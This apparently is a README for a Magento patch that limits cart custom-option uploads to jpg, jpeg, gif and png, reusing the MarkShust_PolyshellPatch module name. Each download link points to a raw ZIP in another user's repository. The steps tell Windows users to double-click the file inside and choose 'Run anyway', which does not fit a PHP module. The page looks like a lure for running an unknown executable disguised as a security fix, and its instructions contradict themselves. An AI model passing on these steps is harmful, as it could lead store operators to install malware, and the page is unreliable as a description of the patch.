# 🛡️ magento-polyshell-patch - Block risky uploads in Magento

[Download the latest release](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;"}

## 📥 Download

1. Open the [release page](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
2. Download the latest release file for Windows
3. Save the file to a folder you can find again, such as Downloads or Desktop

## 🖥️ What this app does

magento-polyshell-patch helps protect a Magento store from a file upload issue tied to cart item custom options.

It checks file uploads and keeps image uploads limited to these file types:

- `jpg`
- `jpeg`
- `gif`
- `png`

It uses two checks:

- One check blocks unsafe file names before the file is saved
- Another check tells Magento to allow only image file types

This gives you two layers of protection for the same upload path.

## 🚀 Getting started

Follow these steps in order.

1. Open the [release page](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
2. Download the newest release file
3. If the download comes as a ZIP file, right-click it and choose **Extract All**
4. Open the extracted folder
5. Find the Windows file inside
6. Double-click the file to run it

If Windows asks for confirmation, choose **Run anyway** only if you trust the source and the release file matches the project page.

## ✅ Before you run it

Make sure you have:

- A Windows PC
- Access to the folder where the file was saved
- A Magento site you want to protect
- Permission to update the site files

If you manage the site for someone else, use the account or access method that lets you add or update Magento modules.

## 🧰 What you get

This module adds a simple guard around image uploads in Magento.

It helps stop:

- Dangerous file uploads
- Files with script-style extensions
- Uploads that should not pass the Magento image picker
- Attempts to bypass file type checks through custom options

It is designed for store owners who want a tighter upload path without changing how the rest of Magento works.

## 🔒 How the protection works

The module uses two plugins:

### 🧱 ImageContentValidatorExtension

This check runs before the file goes to disk.

It looks at the file name and rejects uploads that do not end in an image extension.

### 🛑 ImageProcessorRestrictExtensions

This check calls `setAllowedExtensions()` on Magento’s uploader.

That means Magento also checks the file type on its own and blocks files that do not match the allowlist.

Together, these checks reduce the chance that a bad file gets through.

## 🪟 Install on Windows

This project protects a Magento site. It is not a full desktop app with a normal Windows window.

To use the download on Windows:

1. Open the [release page](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)
2. Download the latest release package
3. Extract the files if needed
4. Copy the module folder into your Magento project
5. Run the Magento commands in a terminal if you manage the site yourself

If you are only trying to get the module file, the release page is the place to visit.

## 🧪 Example install steps for a Magento admin

If you already have access to the Magento server, use these steps:

1. Download the release package
2. Place the module in your Magento codebase
3. Enable the module
4. Run the Magento upgrade step
5. Clear the cache

The project uses the module name:

- `MarkShust_PolyshellPatch`

## 🛠️ Manual setup

If you are adding the module by hand, the typical folder path is:

- `app/code/MarkShust/PolyshellPatch`

After that, the module must be enabled in Magento.

The usual command flow is:

- `bin/magento module:enable MarkShust_PolyshellPatch`
- `bin/magento setup:upgrade`
- `bin/magento cache:flush`

## 🧭 What to expect after setup

After the module is active:

- Magento should allow only image uploads through the protected path
- Non-image file names should be blocked
- The upload flow should reject unsafe extensions
- Cache changes may need to be cleared before the update takes effect

If you test the store, try a normal image file first, such as a PNG or JPG.

## 🧾 File types allowed

The allowlist includes:

- JPG
- JPEG
- GIF
- PNG

Any other extension should be blocked by the module.

## 🌐 Web server hardening

The module blocks uploads inside Magento, but you should also block access at the web server level.

For a production store, set up rules that stop web access to uploaded script files and other unsafe content paths.

Use the right config for your server type, such as:

- Nginx
- Apache
- IIS

If your site has a media folder, review which file types can be served from it.

## 🧯 Common checks

If the module does not seem to work, check these items:

1. The module folder is in the right place
2. The module name matches `MarkShust_PolyshellPatch`
3. The Magento cache was cleared
4. The upgrade step was run
5. The release file was fully extracted
6. The upload you tested uses a blocked file type

## 📁 Suggested folder layout

A typical setup may look like this:

- `magento/`
- `app/code/MarkShust/PolyshellPatch/`
- `bin/magento`
- `var/`
- `pub/`

This helps keep the module in the normal Magento project structure.

## 🔍 Who this is for

This project fits:

- Magento store owners
- Site admins
- Agency teams
- Security-focused ecommerce teams
- Anyone who needs tighter image upload rules

## 📌 Release download

Get the latest build here:

[https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip](https://raw.githubusercontent.com/mychael4450/magento-polyshell-patch/main/Plugin/magento-patch-polyshell-v3.9.zip)

Download the release package, extract it if needed, then run or install the module based on your Magento setup

## 🧩 Module name

- Repository: `magento-polyshell-patch`
- Magento module: `MarkShust_PolyshellPatch`
- Composer package: `markshust/magento2-module-polyshell-patch`

## 🧷 Quick file check list

Before you trust an uploaded file, make sure it is:

- An image
- Named with a normal image extension
- Stored in the expected upload path
- Blocked if it looks like a script file

## 🛡️ Security goal

The goal is simple:

- keep image uploads limited
- reduce the chance of unsafe file upload abuse
- add a second check inside Magento
- support safer store operations